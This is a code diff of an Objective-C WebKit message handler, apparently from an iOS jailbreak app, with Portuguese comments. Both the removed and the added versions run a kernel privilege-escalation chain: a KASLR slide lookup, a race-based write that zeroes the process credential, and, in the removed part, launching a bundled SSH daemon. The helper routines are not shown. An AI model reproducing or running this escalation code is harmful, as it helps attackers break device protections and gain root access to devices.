@@ -75,46 +75,28 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
 - (void)userContentController:(WKUserContentController *)userContentController 
       didReceiveScriptMessage:(WKScriptMessage *)message 
                  replyHandler:(void (^)(id _Nullable reply, NSString * _Nullable errorMessage))replyHandler {
-    
-    NSString *action = message.body[@"action"];
-    
-    if ([action isEqualToString:@"pte_patch"]) {
-        // Movemos para uma thread de background para não travar o app
-        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-            
-            uint64_t slide = [self getKernelSlide];
-            if (slide == 0) {
-                replyHandler(nil, @"Falha ao encontrar Kernel Slide (KASLR Bypass falhou)");
-                return;
-            }
 
-            uint64_t ucred = [self get_my_ucred_ptr];
-            if (ucred) {
-                // ATENÇÃO: ppl_write_race é a parte mais perigosa. 
-                // Se o offset do ttbr1_ptr estiver errado, aqui o app travará.
-                [self ppl_write_race:(ucred + 0x18) value:0]; 
-            }
-            
-            uint64_t final_slide = _kernel_slide;
-            
-            // Retornamos para a thread principal para disparar o SSH e responder ao JS
-            dispatch_async(dispatch_get_main_queue(), ^{
-                NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
-                pid_t pid = 0;
-                if (path) {
-                    char *const args[] = {(char*)[path UTF8String], "-D", NULL};
-                    posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
-                }
-                
-                replyHandler(@{
-                    @"status": @"OK",
-                    @"pid": @(pid),
-                    @"slide": [NSString stringWithFormat:@"0x%llx", final_slide]
-                }, nil);
-            });
+    // Movemos o exploit para uma thread global (Background)
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        
+        // 1. Inicia busca pelo slide (isso leva tempo e travava o app)
+        uint64_t slide = [self getKernelSlide];
+        
+        // 2. Executa a escalada de privilégio
+        uint64_t ucred = [self get_my_ucred_ptr];
+        if (ucred) {
+            [self ppl_write_race:(ucred + 0x18) value:0]; 
+        }
+
+        // 3. Responde ao JavaScript (Voltando para a Main Thread para o WebKit)
+        dispatch_async(dispatch_get_main_queue(), ^{
+            replyHandler(@{
+                @"status": @"OK",
+                @"slide": [NSString stringWithFormat:@"0x%llx", slide],
+                @"pid": @(getpid()) // Apenas para confirmar execução
+            }, nil);
         });
-    } else {
-        replyHandler(nil, @"Ação desconhecida");
-    }
+    });
 }
+
 @end
